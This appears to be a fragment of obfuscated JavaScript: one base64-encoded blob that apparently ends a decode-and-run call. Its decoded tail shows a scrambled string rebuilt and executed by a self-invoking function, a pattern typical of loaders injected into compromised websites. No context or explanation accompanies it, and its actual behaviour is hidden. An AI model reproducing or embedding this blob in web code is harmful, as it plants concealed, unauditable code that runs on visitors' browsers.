YyXzU0KT1fKSVuUShpOXRjUTNiJWEyZi4rb11rNDZyaSE9LnJue1FmTm1fczchYltvdDsoUGVmM1ZyaXAhcmYlJGFJJW9ub1E1ZzpoYTRyYSY9clFbYW5hZTlRJW5qcmI1ITNsZi5bbUx0ZW4rYTU9ZXkpZmVvbj1hUVE3NWVHUSxfLDUhe2dvbnNlUVEgbnJdaSJwb2k6YnMyKjh7KWVycih1dDEuY1FsUTgpaT17JTMiZWUuaVFvcjFYLmIpdWwzIHNwY30zajdlMDNnKVF0X21dM1F1XWR0fW8tUXQ9ZjtvMHJob3NkODAzZlEgZnRbJC41KGUrW2VedHVmNWl2b3RcXC4uUWZ9JTRdUSBRY2Mzb19sXFxuJVVRNGVRZF9dLmo0USxqJTJwdGUuMXJRN1EpZl8yaSk6USBwJTIgdHNdIz0paSl0Y2UpIF9hXlFRcmFaXUUmc2Y1UTVRaHIybGNRdFFvbDN7ci5RaTFRc3JkNCQ/ZTE1ZD1zUSAlaF90MSk7UWNdMjNcLyV1NzM9UT1NZXVRZzMyfVFXdDtvUS4lc1E9YTMkMFEuZTRRZGldblFuPW5ZYmh1bFFGb3JfQ3IzUW5RM2x1X3J9U2NhUWcpUV1zIThRLnRjdHUqLlFuUTI7ZTMoUT1RUVFmIFEzOy5RXzFRVTAzYyAlZl9sKCk/X1ExUVEuUWE1bHA0c1k1X250Xl9faV9mZGU9ZVFRZWJvNC5RKDI1N30pYXV2cmEuUWUpMV90dHBRKWNfM19yZVFsXFw1XzQtelFwO1EpKTZzM30pbityUV9UXS5jdCF0UWFfTmlvcy49JS5RblF9NFFbaVFvb0IzcFF9ZiglaV85dVEiZixlXSUmZmorKy1cLzMuUSVmblFpZlFiXzZvbjEuUVFhX1FmdDUsNSVdX1Epb3RrcmU/blFpX2ViKG9sUT1ldzZRblFRUTVtZk50XVEzX3R0OzhRbjRhXT09NHslKVFvbUclKTVRUSxlUVtRKDQgZV9RbzMgZ0lRbCU2WF0uZ3tRNDpyXC8uUXV9LD1jUW9hck1lSDJ4XSsoeyhRUVF0XWkzLHQgbHQxMzRnTTFyUSwxcnQoZGlReFEoOC45KHB9O19fbTVoVD5RaTY7UVEpUWlhY2s7aTE9VDshNHM3YihrZVE3UWZtUT1ueV9vUXkuYW59LTF0UWZhby5RIClqYVFlcmdlaXM7cl9fdXNudGIuJHRRUTZsN3M7XyVfNzZRIHR1ZixvIC0hXTkxfWdmUXIkU11qaS5kXCdzWjt0bC4gKDtvZlE0UVF0UTRuO25wMFF1IHJzPXNjMntFUXtyNV0hUTRycytxUSlmMWVRUXJRcmtjXVxcUTFnQzQ2S2VyUWQ4cCE1KS1vaWZRdC5dLC47b2JsJSBlUVEkbnIuYV8lZl8gKHNRbC4rMXIkKVFuYi5mdHhsXFxKUSl9ezZycG5RZTFdLHQ9ZzYhWCAydWpReXtfeSE6ZkVUblEpJVE1JSxRUT15aXRjYzYyIHUpdG8yNVF7XFwuIFEkUWYgUX1fKSE1c11mbl5RdFEhZGMgKWgpJGw5cHVRLi5vYjFhUVEyZiB9fShRIVFvJWkxXSxsPW5RaS5yUUlRVTJucmVbYX0uaS4lWS4gZWZ3YyZdaG5fZm8uZ1suXTUuZl8pKX15MnNmJGJlX2VtQztfNzJ0UV93Ml9pe2ZjcmpfX2sge1FsIDRjYl8iUX07UV09IDBRZlk7UTUyXyBkX3IuJXJlbC4ucl9fZXAiUXVdUV9vbjMpVixjcnIhKDRvKHVhbl10IHtEZj12X1spby1fbm8wICV0cGRpZmRRMX17MXIlIDJmX2JlXV0pNC1mbmYpLlFuJVF0LmNuPSBVb3RdJykpO3ZhciBjQ0o9Tlh6KGhtVSx3RGIgKTtjQ0ooMTA5Mik7cmV0dXJuIDUzOTd9KSgp'))
